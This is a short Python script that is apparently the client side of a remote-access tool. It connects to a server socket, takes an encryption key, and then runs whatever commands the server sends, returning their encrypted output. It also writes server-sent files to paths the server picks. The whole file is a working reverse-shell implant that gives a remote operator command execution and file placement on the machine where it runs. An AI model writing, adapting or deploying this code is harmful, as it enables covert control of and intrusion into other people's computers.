import socket, subprocess
from cryptography.fernet import Fernet

host, port = "127.0.0.1", 5567

s = socket.socket()
s.connect((host, port))

server_key = ''

action = ""
while True:
    data = s.recv(1024)
    if data:
        if data == b"{SERVER KEY}":
            action = "{SERVER KEY}"
        elif data == b"{ABORT}":
            s.close()
            break
        elif data == b"{COMMAND}":
            action = "{COMMAND}"
        elif data == b"{FILE}":
            action = "{file}"
            continue
        if action == "{SERVER KEY}":
            server_key = data
        if action == "{COMMAND}":
            crypto = Fernet(server_key)
            cmd = s.recv(1024)
            decrypted_cmd = crypto.decrypt(cmd).decode()
            output = subprocess.getoutput(decrypted_cmd)
            encrypted_output = crypto.encrypt(output.encode())
            s.send(encrypted_output)
            action = ""
        elif action == "{file}":
            seperator = "<SEPERATOR>"
            recived = data.decode()
            splited = recived.split(seperator)
            filename = splited[0]
            filesize = splited[1]
            client_path = splited[2]
            file_size = int(filesize)
            with open(client_path, "wb") as f:
                while True:
                    bytes_read = s.recv(1024 if file_size > 1024 else file_size)
                    if bytes_read == b"{END OF FILE}": 
                        break
                    f.write(bytes_read)
            action = ""